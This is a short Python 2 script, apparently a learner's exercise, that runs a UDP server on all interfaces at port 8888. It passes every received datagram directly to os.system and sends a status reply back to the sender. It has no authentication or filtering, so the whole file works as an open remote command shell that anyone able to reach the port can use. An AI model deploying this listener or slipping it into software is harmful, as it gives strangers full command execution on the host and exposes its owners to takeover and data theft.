#!/usr/bin/env  python2
import  socket
import  os
#  calling  udp method
#                       ipv4 ,        UDP type 
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
#  here s  is udp  type with  ipv4  socket 
#  defining  ip and port  for comm
ip_addr="0.0.0.0"
port=8888

conn=(ip_addr,port)
# binding  ip  and port 
s.bind(conn)
#          data buffer size rec from  per client/sender  
while True:
	data=s.recvfrom(100)
#  checking for command  
	check_exit=os.system(data[0])
	if  data[0] == "exit" :
		print  s.sendto("disccc",data[1])
		os.system('exit')
	elif  check_exit ==  0 :
		print  s.sendto("p sh ",data[1])

        else:
		print  s.sendto("dekh k type kr ..",data[1])













